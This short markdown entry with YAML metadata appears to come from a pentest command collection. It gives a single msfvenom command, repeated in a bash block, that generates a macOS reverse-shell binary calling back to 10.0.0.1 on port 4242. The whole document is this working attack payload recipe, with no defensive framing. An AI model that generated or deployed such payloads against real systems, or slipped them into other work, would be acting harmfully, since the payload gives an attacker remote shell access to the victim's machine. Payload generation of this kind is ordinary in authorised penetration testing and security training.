---
id: 7a2bc55c-0953-4325-8d1b-2fd4742c5f61
name: Generate OSX Reverse Shell Payload
type: command
executor: bash
data: $ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho
  > shell.macho
output: null
created_at: '2023-04-06T03:56:24.923447+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
---

# Generate OSX Reverse Shell Payload

```bash
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho
```


